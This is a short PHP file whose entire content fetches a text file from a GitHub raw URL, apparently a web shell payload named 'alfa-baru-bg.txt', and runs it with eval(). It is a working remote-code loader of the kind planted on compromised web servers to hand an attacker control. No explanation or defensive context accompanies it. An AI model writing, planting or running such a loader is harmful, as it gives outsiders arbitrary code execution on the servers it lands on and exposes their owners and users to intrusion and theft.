<?php

$content = file_get_contents(urldecode('https://raw.githubusercontent.com/marketmg2/asss/refs/heads/main/alfa-baru-bg.txt'));

$content = "?> ".$content;
eval($content);
